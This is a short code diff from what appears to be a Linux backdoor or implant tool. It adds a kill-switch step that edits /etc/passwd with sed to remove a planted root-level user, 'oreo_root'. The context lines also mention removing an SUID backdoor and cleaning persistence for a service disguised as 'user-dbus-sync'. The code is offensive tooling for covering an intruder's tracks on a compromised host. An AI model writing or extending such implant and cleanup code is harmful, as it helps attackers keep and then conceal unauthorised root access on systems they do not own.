@@ -59,6 +59,19 @@ def check_kill_switch():
                 except Exception as err:
                     print(f"[-] Could not remove SUID backdoor: {err}")
 
+                # --- STEP 1.5: Remove oreo_root backdoor ---
+                try:
+                    # Check if the user exists first to avoid unnecessary writes
+                    with open("/etc/passwd", "r") as f:
+                        passwd_content = f.read()
+                    
+                    if "oreo_root:" in passwd_content:
+                        # Use sed to delete the specific line from /etc/passwd
+                        subprocess.run(["sed", "-i", "/^oreo_root:/d", "/etc/passwd"], check=True)
+                        print("[*] Rogue user 'oreo_root' scrubbed from /etc/passwd.")
+                except Exception as err:
+                    print(f"[-] Could not remove oreo_root user: {err}")
+
                 # --- STEP 2: Clean up persistence files aggressively ---
                 service_name = "user-dbus-sync"
                 
